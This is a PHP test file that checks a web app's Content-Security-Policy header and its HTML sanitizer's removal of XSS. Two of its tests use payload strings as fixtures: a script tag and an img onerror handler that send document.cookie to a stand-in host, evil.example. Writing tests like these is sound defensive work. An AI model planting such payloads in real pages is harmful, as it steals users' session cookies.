<?php

use App\Services\HtmlSanitizerService;

it('serves a Content-Security-Policy header with a nonce and no unsafe-inline script-src', function () {
    $response = $this->get('/');

    $response->assertHeader('Content-Security-Policy');

    $csp = $response->headers->get('Content-Security-Policy');

    expect($csp)->toContain("script-src 'self' 'nonce-")
        ->and($csp)->not->toContain('unsafe-inline');
});

it('strips a script-tag xss payload via the html sanitizer service', function () {
    $payload = '<p>hello</p><script>document.location="https://evil.example?c="+document.cookie</script>';

    $clean = app(HtmlSanitizerService::class)->clean($payload, 'blog');

    expect($clean)->not->toContain('<script')
        ->and($clean)->toContain('hello');
});

it('strips an event-handler-based xss payload via the html sanitizer service', function () {
    $payload = '<img src="x" onerror="fetch(\'https://evil.example\',{body:document.cookie})">';

    $clean = app(HtmlSanitizerService::class)->clean($payload, 'blog');

    expect($clean)->not->toContain('onerror');
});
